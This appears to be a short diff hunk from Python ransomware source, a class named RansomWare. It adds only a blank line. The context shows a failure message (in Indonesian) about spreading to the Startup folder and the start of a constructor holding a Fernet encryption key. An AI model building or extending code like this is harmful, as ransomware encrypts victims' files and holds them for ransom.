@@ -102,6 +102,7 @@ class RansomWare:
             print(f"[!] Gagal menyebar ke Startup folder: {e}")
 
     
+
     def __init__(self):
         # Key that will be used for Fernet object and encrypt/decrypt method
         self.key = None
